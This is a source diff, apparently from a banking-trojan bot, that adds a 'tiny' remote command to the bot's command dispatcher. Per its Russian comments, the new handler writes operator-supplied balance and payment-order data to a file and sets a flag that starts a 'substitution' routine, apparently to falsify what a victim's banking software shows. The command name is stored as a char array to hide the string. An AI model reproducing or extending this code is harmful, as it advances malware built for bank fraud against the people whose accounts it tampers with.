@@ -1207,6 +1207,19 @@ bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+#ifdef TinyH
+	TASKDBG( "Tiny", "%s", Args );
+	int c_args = m_lstrlen(Args);
+	//сохраняем переданный баланс и платежки
+	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), Args, c_args + 1 );
+	//уставливаем флаг для запуска подмены
+	Bot->CreateFileA( 0, GetStr(TinyFlagUpdate).t_str() );
+#endif
+	return true;
+}
+
 
 /*
 
@@ -1331,8 +1344,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
 	const static char CommandDownload2[]     = {'d','o','w','n','l','o','a','d','2',0};
 	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
+	const static char CommandTiny[]			 = {'t','i','n','y',0};
 
-	int Index = StrIndexOf( Command, false, 17,
+	int Index = StrIndexOf( Command, false, 18,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1349,7 +1363,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandExec,
 							(PCHAR)CommandAddTrust,
 							(PCHAR)CommandDownload2,
-							(PCHAR)CommandCBank
+							(PCHAR)CommandCBank,
+							(PCHAR)CommandTiny
 						  );
 
 
@@ -1372,6 +1387,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 14: return ExecuteAddTrust;
 		case 15: return ExecuteDownload2;
 		case 16: return ExecuteCBank;
+		case 17: return ExecuteTiny;
 
     default: ;
 	}
